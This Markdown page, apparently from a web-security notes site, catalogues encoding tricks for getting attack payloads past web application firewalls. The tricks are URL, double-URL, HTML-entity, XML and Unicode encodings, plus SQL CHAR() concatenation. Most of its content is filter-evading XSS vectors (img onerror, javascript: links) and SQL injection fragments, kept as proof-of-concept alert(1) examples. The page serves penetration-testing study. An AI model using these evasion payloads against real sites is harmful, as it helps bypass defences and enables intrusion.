---
title: "General Obfuscation"
weight: 1
---

# General Obfuscation

{{< hint style=notes >}}
**Note**: for Javascript obfuscation go on [Javascript & Obfuscation]({{< ref "web/web-security/javascript-and-obfuscation" >}})
{{< /hint >}}

## URL encoding

Sometimes, WAFs may fail to properly URL decode your input during checks.

-> Encode the keywords, so `SELECT` becomes `%53%45%4C%45%43%54`.

### Double URL encoding

Since the WAF decodes the input only once, it may fail to detect the threat. If the back-end server double-decodes it, the payload will be injected successfully.

```sh
[...]/?search=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E
```

### HTML encoding

In certain HTML locations, like element text or attribute values, browsers automatically decode these references when parsing.

Server-side checks for alert() may miss it if you HTML encode characters.

```html
<img src=x onerror="&#x61;lert(1)">
```

When the browser renders the page, it will decode and execute the injected payload.

**Leading zeros**

HTML encode `:` -> `&#58;` = `&#0000000000058;`

`<a href="javascript&#00000000000058;alert(1)">Click me</a>`

---

## XML encoding

XML supports character encoding with the same numeric escape sequences as HTML.

```xml
<stockCheck>
    <productId>
        123
    </productId>
    <storeId>
        999 &#x53;ELECT * FROM information_schema.tables
    </storeId>
</stockCheck>
```

---

## Multiple encodings

```html
<a href="javascript:&bsol;u0061lert(1)">Click me</a>
```

(HTML) `&bsol;` -> `\`

```html
<a href="javascript:\u0061lert(1)">Click me</a>
```

(Unicode) `\u0061` -> `a`

```html
<a href="javascript:alert(1)">Click me</a>
```

---

## SQL CHAR() function

`CHAR(83)` = `CHAR(0x53)` = `S`

`SELECT` is blacklisted ->

```sql
CHAR(83)+CHAR(69)+CHAR(76)+CHAR(69)+CHAR(67)+CHAR(84)
```
